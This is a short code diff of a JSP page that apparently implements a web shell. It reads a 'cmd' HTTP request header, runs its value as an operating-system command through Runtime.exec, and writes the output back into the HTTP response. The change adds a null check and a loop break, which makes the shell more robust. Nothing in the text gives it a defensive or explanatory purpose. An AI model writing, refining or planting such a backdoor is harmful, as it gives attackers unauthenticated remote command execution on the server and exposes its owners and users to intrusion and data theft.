@@ -24,16 +24,19 @@
             obj = method.invoke(httpChannel);
 
             method = obj.getClass().getMethod("getHeader", String.class);
-            obj = method.invoke(obj, "cmd");
+            String cmd = (String)method.invoke(obj, "cmd");
+            if(cmd != null && !cmd.isEmpty()){
+                String res = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();
 
-            String res = new java.util.Scanner(Runtime.getRuntime().exec(obj.toString()).getInputStream()).useDelimiter("\\A").next();
+                method = httpChannel.getClass().getMethod("getResponse");
+                obj = method.invoke(httpChannel);
 
-            method = httpChannel.getClass().getMethod("getResponse");
-            obj = method.invoke(httpChannel);
-
-            method = obj.getClass().getMethod("getWriter");
-            java.io.PrintWriter printWriter = (java.io.PrintWriter)method.invoke(obj);
-            printWriter.println(res);
+                method = obj.getClass().getMethod("getWriter");
+                java.io.PrintWriter printWriter = (java.io.PrintWriter)method.invoke(obj);
+                printWriter.println(res);
+            }
+			
+			break;
         }
     }
 %>
